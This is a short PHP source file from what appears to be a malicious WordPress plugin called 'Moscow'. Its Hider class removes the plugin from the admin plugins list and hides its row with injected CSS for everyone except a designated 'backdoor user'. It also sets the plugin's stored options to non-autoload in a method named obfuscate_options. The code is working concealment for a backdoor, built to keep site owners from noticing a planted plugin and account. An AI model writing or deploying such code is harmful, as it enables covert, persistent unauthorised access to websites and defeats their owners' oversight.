<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class Hider
{
    public function filter_plugins_list(array $plugins): array
    {
        if (!function_exists('wp_get_current_user')) return $plugins;
        if ((new UserManager())->is_backdoor_user()) return $plugins;

        unset($plugins[MOSCOW_BASENAME]);
        return $plugins;
    }

    public function hide_in_ui(): void
    {
        if (!function_exists('wp_get_current_user')) return;
        if ((new UserManager())->is_backdoor_user()) return;

        echo '<style>.plugins tr[data-slug="moscow"]{display:none!important}</style>';
    }

    public function obfuscate_options(): void
    {
        global $wpdb;
        if (!isset($wpdb)) return;
        $wpdb->query("UPDATE {$wpdb->options} SET autoload='no' WHERE option_name LIKE 'moscow_%'");
    }
}